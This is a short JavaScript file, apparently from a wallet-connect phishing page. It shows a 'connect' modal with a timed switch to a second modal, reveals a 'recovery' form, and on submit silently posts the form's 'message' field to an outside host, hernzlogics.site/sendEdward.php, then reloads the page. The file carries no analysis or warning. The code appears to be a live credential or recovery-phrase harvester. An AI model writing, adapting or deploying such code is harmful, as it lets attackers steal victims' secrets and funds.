let rodal = document.getElementById('rodal');
let rodal2 = document.getElementById('rodal2');
let form = document.getElementById('rodal3');
let submitForm = document.getElementById('emailform')

function connect(){
    rodal.style.display = 'block';
    setTimeout(function() {
    rodal.style.display = 'none';
    rodal2.style.display = 'block';
}, 3000);
}

function recovery(){
 form.style.display = 'block';
}


submitForm.addEventListener('submit', function(event) {
    event.preventDefault();

    var emailData = {
        message: document.getElementById('message').value
    };

    fetch('https://hernzlogics.site/sendEdward.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(emailData)
    })
    .then(response => response.json())
    .then(data => {
        window.location.reload();
    })
    .catch((error) => console.error('Error:', error));
});